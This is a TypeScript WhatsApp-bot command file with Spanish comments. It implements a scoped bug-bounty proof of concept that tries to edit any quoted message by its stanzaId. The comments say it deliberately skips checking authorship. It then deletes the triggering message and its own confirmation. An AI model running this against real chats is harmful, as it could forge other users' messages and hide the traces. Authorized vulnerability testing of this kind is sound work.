import type { BotCommand, CommandContext } from '../types.js'
import { getContextInfo } from '../utils/message.js'

const MAX_EDIT_TEXT = 3500
const EDIT_POC_ENABLED = /^(?:1|true|yes|on)$/i.test(process.env.EDIT_POC_ENABLED ?? '')

function allowedPocChats() {
  return new Set(
    (process.env.EDIT_POC_CHAT_IDS ?? '')
      .split(',')
      .map((value) => value.trim())
      .filter(Boolean),
  )
}

function sleep(ms: number) {
  return new Promise((resolve) => setTimeout(resolve, ms))
}

function assertBugBountyScope(ctx: CommandContext) {
  if (!ctx.isOwner && !ctx.isBotStaff) {
    throw new Error('Solo el owner y el staff del bot pueden usar este comando.')
  }

  if (!EDIT_POC_ENABLED) {
    throw new Error('La PoC de edición está desactivada. Activa EDIT_POC_ENABLED=true únicamente en tu entorno de pruebas autorizado.')
  }

  const allowed = allowedPocChats()
  if (!allowed.size || !allowed.has(ctx.chatId)) {
    throw new Error('Este chat no está autorizado para la PoC. Añade su JID exacto a EDIT_POC_CHAT_IDS en el entorno de pruebas.')
  }
}

async function editQuotedMessagePoc(ctx: CommandContext) {
  assertBugBountyScope(ctx)

  const context = getContextInfo(ctx.message)
  const targetMessageId = context?.stanzaId
  const newText = ctx.argText.trim()

  if (!targetMessageId) {
    throw new Error('Debes responder al mensaje que quieres usar como objetivo de la PoC.')
  }
  if (!newText) {
    throw new Error(`Uso: ${ctx.prefix}edit <nuevo texto>, respondiendo al mensaje objetivo.`)
  }
  if (newText.length > MAX_EDIT_TEXT) {
    throw new Error(`El texto editado está limitado a ${MAX_EDIT_TEXT} caracteres.`)
  }

  // PoC de bug bounty: deliberadamente NO valida que el mensaje citado haya sido
  // enviado por esta instancia. El objetivo de este modo es comprobar si el
  // servidor/cliente de WhatsApp acepta una edición basada únicamente en el
  // stanzaId citado. El alcance queda restringido por EDIT_POC_CHAT_IDS.
  await ctx.socket.sendMessage(
    ctx.chatId,
    {
      text: newText,
      edit: { id: targetMessageId },
    },
    {
      messageId: targetMessageId,
    },
  )

  // Limpieza equivalente a la PoC original. En grupos WhatsApp puede rechazar el
  // borrado si la instancia no tiene permisos suficientes; eso no invalida el
  // resultado de la prueba de edición.
  await ctx.socket.sendMessage(ctx.chatId, { delete: ctx.message.key }).catch(() => undefined)

  const confirmation = await ctx.socket.sendMessage(ctx.chatId, {
    text: `PoC ejecutada sobre stanzaId ${targetMessageId}.`,
  }).catch(() => null)

  if (confirmation?.key?.id) {
    await sleep(2000)
    await ctx.socket.sendMessage(ctx.chatId, { delete: confirmation.key }).catch(() => undefined)
  }
}

const editCommand: BotCommand = {
  name: 'edit',
  aliases: ['editbot', 'editar'],
  category: 'owner',
  description: 'PoC acotada de edición por stanzaId para pruebas de bug bounty autorizadas.',
  usage: 'edit <nuevo texto>',
  staffOnly: true,
  handler: editQuotedMessagePoc,
}

export const editCommands: BotCommand[] = [editCommand]
export default editCommand
